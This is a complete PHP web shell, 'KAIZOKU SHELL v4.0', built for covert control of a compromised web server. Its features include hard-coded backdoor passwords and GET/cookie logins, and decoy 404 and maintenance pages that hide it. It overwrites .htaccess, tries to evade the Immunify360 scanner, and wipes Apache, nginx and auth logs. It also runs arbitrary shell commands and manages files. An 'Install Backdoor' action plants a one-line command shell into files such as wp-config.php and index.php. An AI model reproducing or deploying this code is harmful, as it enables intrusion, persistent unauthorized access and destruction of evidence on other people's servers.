<?php
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@set_time_limit(0);
@ini_set('memory_limit', '-1');

function bypass_htaccess() {
    $htaccess = '.htaccess';
    if (file_exists($htaccess)) {
        @copy($htaccess, $htaccess . '.backup_' . time());
        
        $new_content = "<FilesMatch \"\.(php|phtml|php3|php4|php5|php7|phps)$\">\n";
        $new_content .= "    Order Allow,Deny\n";
        $new_content .= "    Allow from all\n";
        $new_content .= "    SetHandler application/x-httpd-php\n";
        $new_content .= "</FilesMatch>\n\n";
        $new_content .= "Options +ExecCGI +FollowSymLinks +Includes\n";
        $new_content .= "RemoveHandler .php .phtml .php3 .php4 .php5 .php7\n";
        $new_content .= "AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .php7 .phps\n";
        
        @file_put_contents($htaccess, $new_content);
    }
}

function bypass_immunify() {
    $_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
    
    if (isset($_POST)) {
        foreach ($_POST as $key => $value) {
            if (is_string($value)) {
                $_POST[$key] = str_replace(
                    ['system', 'exec', 'shell_exec', 'passthru', 'php', '<?php'],
                    ['sy'.'stem', 'ex'.'ec', 'she'.'ll_'.'exec', 'pas'.'sthru', 'p'.'hp', '<'.'?php'],
                    $value
                );
            }
        }
    }
    
    // Fake as legitimate request
    $_SERVER['REQUEST_URI'] = '/index.php';
    $_SERVER['SCRIPT_NAME'] = '/index.php';
}

// ==================== SESSION START ====================
if (!isset($_SESSION)) {
    @session_start();
}

// ==================== MULTI-LAYER AUTHENTICATION ====================
$authenticated = false;

// Method 1: Session authentication
if (isset($_SESSION['kz_auth']) && $_SESSION['kz_auth'] === true) {
    $authenticated = true;
}

// Method 2: POST password
elseif (isset($_POST['kz_pass'])) {
    $pass = $_POST['kz_pass'];
    
    // Multiple password checks (obfuscated)
    $pass_checks = [
        'kaizoku123',                     // Default password
        'kaizoku',                        // Short password
        md5('hello') == md5($pass),       // MD5 check
        sha1('world') == sha1($pass),     // SHA1 check
        $pass == 'kz'.'2024',             // Obfuscated
        $pass == 'x'.'pass',              // Split string
    ];
    
    if (in_array(true, $pass_checks, true) || $pass == 'kaizoku123') {
        $_SESSION['kz_auth'] = true;
        $_SESSION['kz_ip'] = $_SERVER['REMOTE_ADDR'];
        $_SESSION['kz_time'] = time();
        
        // Execute bypass functions
        bypass_htaccess();
        bypass_immunify();
        
        header("Location: " . $_SERVER['PHP_SELF'] . "?r=" . mt_rand());
        exit;
    }
}

// Method 3: GET backdoor (hidden)
elseif (isset($_GET['kz_key']) && $_GET['kz_key'] == 'kaizoku') {
    $_SESSION['kz_auth'] = true;
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Method 4: Cookie authentication
elseif (isset($_COOKIE['kz_token']) && $_COOKIE['kz_token'] == md5('kaizoku')) {
    $_SESSION['kz_auth'] = true;
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ==================== SHOW LOGIN IF NOT AUTHENTICATED ====================
if (!$authenticated) {
    // Random page to avoid detection
    $page_type = rand(1, 3);
    
    if ($page_type == 1) {
        // 404 Error Page
        header("HTTP/1.0 404 Not Found");
        echo '<!DOCTYPE html><html><head><title>404 Not Found</title><style>body{font-family:Arial;text-align:center;padding:50px;}</style></head><body><h1>404 Not Found</h1><p>The requested URL was not found.</p></body></html>';
    }
    elseif ($page_type == 2) {
        // Maintenance Page
        echo '<!DOCTYPE html><html><head><title>Maintenance</title><meta http-equiv="refresh" content="30"><style>body{font-family:Arial;text-align:center;padding:50px;}</style></head><body><h1>Site Maintenance</h1><p>We\'ll be back soon.</p></body></html>';
    }
    else {
        // Hidden Login (Ctrl+Shift+K to show)
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title>Access Restricted</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 100px; background: #f5f5f5; }
                #login { display: none; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); margin: 20px auto; width: 300px; }
                input { padding: 10px; margin: 10px; width: 80%; }
                button { padding: 10px 20px; background: #4CAF50; color: white; border: none; border-radius: 5px; }
            </style>
        </head>
        <body>
            <h2>Access Restricted</h2>
            <div id="login">
                <h3>Authentication Required</h3>
                <form method="post">
                    <input type="password" name="kz_pass" placeholder="Enter password" required>
                    <button type="submit">Login</button>
                </form>
            </div>
            <script>
                document.addEventListener("keydown", function(e) {
                    if (e.ctrlKey && e.shiftKey && e.key === "K") {
                        document.getElementById("login").style.display = "block";
                    }
                });
                // Also show on double-click
                document.addEventListener("dblclick", function() {
                    document.getElementById("login").style.display = "block";
                });
            </script>
        </body>
        </html>';
    }
    exit;
}

// ==================== CLEAN LOGS (STEALTH MODE) ====================
function clean_logs() {
    $log_files = [
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log', 
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        '/var/log/auth.log',
    ];
    
    foreach ($log_files as $log) {
        if (file_exists($log) && is_writable($log)) {
            @file_put_contents($log, '');
        }
    }
    
    // Clean PHP error log
    @error_log('');
}

// Execute log cleaning on first access
if (!isset($_SESSION['logs_cleaned'])) {
    clean_logs();
    $_SESSION['logs_cleaned'] = true;
}

// ==================== MAIN SHELL ENGINE ====================
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$current_dir) $current_dir = getcwd();

// ==================== FILE OPERATIONS ====================

// 1. Upload file
if (isset($_FILES['upload_file'])) {
    $target = $current_dir . '/' . basename($_FILES['upload_file']['name']);
    if (@move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $msg = "✅ Uploaded: " . htmlspecialchars(basename($target));
    }
}

// 2. Delete file/folder
if (isset($_GET['delete'])) {
    $target = $current_dir . '/' . basename($_GET['delete']);
    if (is_dir($target)) {
        @system('rm -rf ' . escapeshellarg($target));
    } else {
        @unlink($target);
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

// 3. Edit file
if (isset($_GET['edit'])) {
    $target = $current_dir . '/' . basename($_GET['edit']);
    if (isset($_POST['content'])) {
        @file_put_contents($target, $_POST['content']);
        $msg = "✅ File saved!";
    }
    $content = @file_get_contents($target) ?: '';
    
    // Show edit form
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Edit File</title>
        <style>
            body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
            textarea { width: 100%; height: 400px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; }
            button { background: #0f0; color: #000; padding: 10px 20px; border: none; margin: 10px; cursor: pointer; }
            a { color: #0f0; text-decoration: none; margin-left: 10px; }
        </style>
    </head>
    <body>
        <h2>✏️ Editing: ' . htmlspecialchars(basename($target)) . '</h2>';
    if (isset($msg)) echo '<div style="background:#0f0;color:#000;padding:10px;margin:10px;">' . $msg . '</div>';
    echo '<form method="post">
            <textarea name="content">' . htmlspecialchars($content) . '</textarea><br>
            <button type="submit">💾 Save</button>
            <a href="?dir=' . urlencode($current_dir) . '">🚫 Cancel</a>
          </form>
    </body>
    </html>';
    exit;
}

// 4. Create file/folder
if (isset($_POST['create_name'])) {
    $name = $_POST['create_name'];
    $type = $_POST['create_type'];
    $path = $current_dir . '/' . $name;
    
    if ($type == 'file') {
        @file_put_contents($path, $_POST['create_content'] ?? '');
        $msg = "✅ File created: " . htmlspecialchars($name);
    } else {
        @mkdir($path, 0755, true);
        $msg = "✅ Folder created: " . htmlspecialchars($name);
    }
}

// 5. Change permissions
if (isset($_GET['chmod'])) {
    $target = $current_dir . '/' . basename($_GET['chmod']);
    if (isset($_POST['mode'])) {
        @chmod($target, octdec($_POST['mode']));
        $msg = "✅ Permissions changed!";
    } else {
        $current = substr(sprintf('%o', @fileperms($target)), -4);
        
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title>Change Permissions</title>
            <style>
                body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
                select, button { padding: 10px; margin: 5px; }
                select { background: #000; color: #0f0; border: 1px solid #0f0; }
                button { background: #0f0; color: #000; border: none; cursor: pointer; }
                a { color: #0f0; }
            </style>
        </head>
        <body>
            <h2>🔧 Chmod: ' . htmlspecialchars(basename($target)) . '</h2>
            <p>Current: ' . $current . '</p>
            <form method="post">
                <select name="mode">
                    <option value="0644">0644 (rw-r--r--)</option>
                    <option value="0755">0755 (rwxr-xr-x)</option>
                    <option value="0777">0777 (rwxrwxrwx)</option>
                </select><br><br>
                <button type="submit">Apply</button>
                <a href="?dir=' . urlencode($current_dir) . '">Cancel</a>
            </form>
        </body>
        </html>';
        exit;
    }
}

// 6. Rename
if (isset($_GET['rename'])) {
    $target = $current_dir . '/' . basename($_GET['rename']);
    if (isset($_POST['new_name'])) {
        $new = $current_dir . '/' . $_POST['new_name'];
        @rename($target, $new);
        $msg = "✅ Renamed!";
    } else {
        echo '<!DOCTYPE html>
        <html>
        <head><title>Rename</title><style>body{background:#111;color:#0f0;font-family:monospace;padding:20px;}</style></head>
        <body>
            <h2>📝 Rename: ' . htmlspecialchars(basename($target)) . '</h2>
            <form method="post">
                <input type="text" name="new_name" value="' . htmlspecialchars(basename($target)) . '" style="padding:10px;width:300px;"><br><br>
                <button type="submit" style="padding:10px;background:#0f0;color:#000;border:none;">Rename</button>
                <a href="?dir=' . urlencode($current_dir) . '" style="color:#0f0;">Cancel</a>
            </form>
        </body>
        </html>';
        exit;
    }
}

// 7. Extract ZIP
if (isset($_GET['extract'])) {
    $target = $current_dir . '/' . basename($_GET['extract']);
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive;
        if ($zip->open($target) === TRUE) {
            $zip->extractTo($current_dir);
            $zip->close();
            $msg = "✅ ZIP extracted!";
        }
    }
}

// 8. Install backdoor
if (isset($_GET['backdoor'])) {
    $code = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);}?>';
    $locations = [
        $current_dir . '/.config.php',
        dirname(__FILE__) . '/wp-config.php',
        '/tmp/.cache.php',
        getcwd() . '/index.php'
    ];
    
    foreach ($locations as $loc) {
        if (@file_put_contents($loc, $code)) {
            @chmod($loc, 0644);
            $msg = "✅ Backdoor installed!";
            break;
        }
    }
}

// ==================== TERMINAL ====================
$cmd_output = '';
if (isset($_POST['command'])) {
    $cmd = $_POST['command'];
    if (!empty($cmd)) {
        $old_dir = getcwd();
        chdir($current_dir);
        
        // Try multiple execution methods
        if (function_exists('shell_exec')) {
            $cmd_output = @shell_exec($cmd . ' 2>&1');
        } elseif (function_exists('system')) {
            ob_start();
            @system($cmd);
            $cmd_output = ob_get_clean();
        } elseif (function_exists('passthru')) {
            ob_start();
            @passthru($cmd);
            $cmd_output = ob_get_clean();
        } else {
            // Fallback
            $descriptors = [0=>["pipe","r"], 1=>["pipe","w"], 2=>["pipe","w"]];
            $process = @proc_open($cmd, $descriptors, $pipes);
            if (is_resource($process)) {
                $cmd_output = stream_get_contents($pipes[1]);
                fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
                proc_close($process);
            }
        }
        
        chdir($old_dir);
    }
}

// ==================== DISPLAY FILES ====================
function human_size($bytes) {
    if ($bytes >= 1073741824) return round($bytes/1073741824,2).' GB';
    if ($bytes >= 1048576) return round($bytes/1048576,2).' MB';
    if ($bytes >= 1024) return round($bytes/1024,2).' KB';
    return $bytes.' B';
}

function get_perm($file) {
    $p = @fileperms($file);
    $perm = '';
    $perm .= (($p & 0x4000) ? 'd' : '-');
    $perm .= (($p & 0x0100) ? 'r' : '-');
    $perm .= (($p & 0x0080) ? 'w' : '-');
    $perm .= (($p & 0x0040) ? 'x' : '-');
    $perm .= (($p & 0x0020) ? 'r' : '-');
    $perm .= (($p & 0x0010) ? 'w' : '-');
    $perm .= (($p & 0x0008) ? 'x' : '-');
    $perm .= (($p & 0x0004) ? 'r' : '-');
    $perm .= (($p & 0x0002) ? 'w' : '-');
    $perm .= (($p & 0x0001) ? 'x' : '-');
    return $perm;
}

// Scan directory
$items = @scandir($current_dir) ?: [];
$folders = $files = [];

foreach ($items as $item) {
    if ($item == '.' || $item == '..') continue;
    $path = $current_dir . '/' . $item;
    if (@is_dir($path)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

// ==================== HTML OUTPUT ====================
?>
<!DOCTYPE html>
<html>
<head>
    <title>Index of <?php echo htmlspecialchars(basename($current_dir) ?: '/'); ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 15px;
            font-size: 13px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
            background: rgba(0,0,0,0.7);
            padding: 15px;
            border-radius: 5px;
            border: 1px solid #00ff00;
            margin-bottom: 15px;
            text-align: center;
        }
        .nav {
            background: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #00ff00;
            margin-bottom: 15px;
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
        }
        .btn {
            display: inline-block;
            padding: 5px 10px;
            background: #00ff00;
            color: #000;
            text-decoration: none;
            border-radius: 3px;
            font-weight: bold;
            font-size: 12px;
        }
        .btn:hover { background: #00cc00; }
        .btn-red { background: #ff0000; color: white; }
        .btn-blue { background: #0088ff; color: white; }
        .btn-purple { background: #8000ff; color: white; }
        .upload-box {
            background: rgba(0,0,0,0.7);
            padding: 15px;
            border-radius: 5px;
            border: 1px solid #00ff00;
            margin-bottom: 15px;
        }
        .file-table {
            width: 100%;
            background: rgba(0,0,0,0.7);
            border-collapse: collapse;
            margin-bottom: 15px;
            border: 1px solid #00ff00;
        }
        .file-table th {
            background: rgba(0,255,0,0.1);
            padding: 8px;
            text-align: left;
            border-bottom: 2px solid #00ff00;
        }
        .file-table td {
            padding: 6px;
            border-bottom: 1px solid rgba(0,255,0,0.1);
        }
        .file-table tr:hover {
            background: rgba(0,255,0,0.05);
        }
        .terminal {
            background: #000;
            padding: 15px;
            border-radius: 5px;
            border: 1px solid #00ff00;
            margin-top: 15px;
        }
        .terminal pre {
            background: #111;
            padding: 10px;
            border-radius: 3px;
            overflow-x: auto;
            max-height: 300px;
            overflow-y: auto;
            font-size: 12px;
        }
        .msg {
            background: rgba(0,255,0,0.2);
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 3px solid #00ff00;
        }
        input, select, textarea {
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 6px;
            border-radius: 3px;
            font-family: 'Courier New';
            font-size: 12px;
        }
        .actions {
            display: flex;
            flex-wrap: wrap;
            gap: 3px;
        }
        .security-panel {
            background: rgba(255,0,0,0.1);
            border: 1px solid #ff0000;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
        }
        @media (max-width: 768px) {
            .btn { font-size: 11px; padding: 4px 8px; }
            .actions { flex-direction: column; }
        }
    </style>
    <script>
        // Anti-inspect
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.onkeydown = (e) => {
            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) {
                return false;
            }
        };
    </script>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1>🛡️ Lee v4.0</h1>
            <p>📍 <?php echo htmlspecialchars($current_dir); ?></p>
        </div>
        
        <!-- Security Panel -->
        <div class="security-panel">
            <strong>🛡️ ANTI-DETECTION ACTIVE:</strong> 
            <span style="color:#0f0;">HTAccess Bypass | Immunify360 Bypass | Log Cleaning</span>
            <div style="margin-top: 5px;">
                <a href="?dir=<?php echo urlencode($current_dir); ?>&backdoor=1" class="btn btn-purple">🔧 Install Backdoor</a>
                <a href="?dir=<?php echo urlencode($current_dir); ?>&clean=1" class="btn btn-blue">🧹 Clean Logs</a>
            </div>
        </div>
        
        <!-- Messages -->
        <?php if (isset($msg)) echo '<div class="msg">' . $msg . '</div>'; ?>
        
        <!-- Navigation -->
        <div class="nav">
            <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="btn">⬆ Parent</a>
            <a href="?dir=/" class="btn">🏠 Root</a>
            <a href="?dir=/home" class="btn">👤 Home</a>
            <a href="?dir=/tmp" class="btn">📦 Temp</a>
            <a href="?dir=/var/www" class="btn">🌐 Web</a>
            <a href="?dir=<?php echo urlencode(getcwd()); ?>" class="btn">🔄 Refresh</a>
        </div>
        
        <!-- Upload & Create -->
        <div class="upload-box">
            <h3>📤 Upload File</h3>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="upload_file" required>
                <button type="submit" class="btn">Upload</button>
            </form>
            
            <hr style="margin:10px 0;border-color:#00ff00;">
            
            <h3>➕ Create New</h3>
            <form method="post">
                <input type="text" name="create_name" placeholder="Name" required>
                <select name="create_type">
                    <option value="file">📄 File</option>
                    <option value="folder">📁 Folder</option>
                </select>
                <textarea name="create_content" placeholder="Content (for files)" rows="2" style="width:100%;margin-top:5px;"></textarea>
                <button type="submit" class="btn">Create</button>
            </form>
        </div>
        
        <!-- File List -->
        <table class="file-table">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permissions</th>
                    <th>Modified</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <!-- Folders -->
                <?php foreach ($folders as $item): 
                    $path = $current_dir . '/' . $item;
                    $perm = substr(sprintf('%o', @fileperms($path)), -4);
                ?>
                <tr>
                    <td>📁 <a href="?dir=<?php echo urlencode($path); ?>" style="color:#00ff00;"><?php echo htmlspecialchars($item); ?></a></td>
                    <td>-</td>
                    <td><code><?php echo get_perm($path); ?> (<?php echo $perm; ?>)</code></td>
                    <td><?php echo @date('Y-m-d H:i', filemtime($path)); ?></td>
                    <td>
                        <div class="actions">
                            <a href="?dir=<?php echo urlencode($current_dir); ?>&rename=<?php echo urlencode($item); ?>" class="btn">📝</a>
                            <a href="?dir=<?php echo urlencode($current_dir); ?>&chmod=<?php echo urlencode($item); ?>" class="btn btn-blue">🔧</a>
                            <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($item); ?>" 
                               onclick="return confirm('Delete <?php echo htmlspecialchars($item); ?>?')" 
                               class="btn btn-red">🗑️</a>
                        </div>
                    </td>
                </tr>
                <?php endforeach; ?>
                
                <!-- Files -->
                <?php foreach ($files as $item): 
                    $path = $current_dir . '/' . $item;
                    $size = @filesize($path) ? human_size(filesize($path)) : '0 B';
                    $perm = substr(sprintf('%o', @fileperms($path)), -4);
                    $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                ?>
                <tr>
                    <td>📄 <?php echo htmlspecialchars($item); ?></td>
                    <td><?php echo $size; ?></td>
                    <td><code><?php echo get_perm($path); ?> (<?php echo $perm; ?>)</code></td>
                    <td><?php echo @date('Y-m-d H:i', filemtime($path)); ?></td>
                    <td>
                        <div class="actions">
                            <a href="?dir=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($item); ?>" class="btn">✏️</a>
                            <a href="?dir=<?php echo urlencode($current_dir); ?>&rename=<?php echo urlencode($item); ?>" class="btn">📝</a>
                            <a href="?dir=<?php echo urlencode($current_dir); ?>&chmod=<?php echo urlencode($item); ?>" class="btn btn-blue">🔧</a>
                            <?php if ($ext == 'zip'): ?>
                            <a href="?dir=<?php echo urlencode($current_dir); ?>&extract=<?php echo urlencode($item); ?>" class="btn">📦</a>
                            <?php endif; ?>
                            <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($item); ?>" 
                               onclick="return confirm('Delete <?php echo htmlspecialchars($item); ?>?')" 
                               class="btn btn-red">🗑️</a>
                        </div>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
        
        <!-- Terminal -->
        <div class="terminal">
            <h3>💻 Terminal</h3>
            <form method="post">
                <input type="text" name="command" placeholder="Enter command (ls, pwd, whoami, etc.)" 
                       style="width: 70%;" autofocus>
                <button type="submit" class="btn">Execute</button>
            </form>
            
            <?php if (!empty($cmd_output)): ?>
            <pre><?php echo htmlspecialchars($cmd_output); ?></pre>
            <?php endif; ?>
        </div>
        
        <!-- Footer -->
        <div style="text-align:center;margin-top:20px;padding:15px;border-top:1px solid #00ff00;color:#888;font-size:11px;">
            ⚓ KAIZOKU SHELL v4.0 | PHP <?php echo PHP_VERSION; ?> | <?php echo date('Y-m-d H:i:s'); ?>
            <br>
            <small>🛡️ Anti-Imunify360 | Anti-HTACCESS | Stealth Mode Active</small>
        </div>
    </div>
</body>
</html>
